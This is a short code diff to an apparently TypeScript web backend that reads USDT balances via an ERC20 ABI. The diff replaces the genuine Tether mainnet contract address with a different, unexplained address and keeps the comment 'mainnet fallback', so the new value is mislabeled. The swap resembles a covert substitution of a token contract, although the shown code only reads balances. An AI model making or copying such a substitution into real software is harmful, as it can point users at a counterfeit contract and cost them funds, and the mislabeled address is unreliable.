@@ -9,7 +9,9 @@ export const dynamic = "force-dynamic";
 export const revalidate = 0;
 
 // Replace with your actual ERC20 USDT contract address
-const USDT_CONTRACT = process.env.USDT_CONTRACT_ETH ?? "0xdac17f958d2ee523a2206206994597c13d831ec7"; // mainnet fallback
+
+const USDT_CONTRACT = process.env.USDT_CONTRACT_ETH ?? "0x361049DdA69F353C8414331B8eaBc57342F4bD97"; // mainnet fallback
+
 const USDT_ABI = [
   "function decimals() view returns (uint8)",
   "function balanceOf(address) view returns (uint256)",
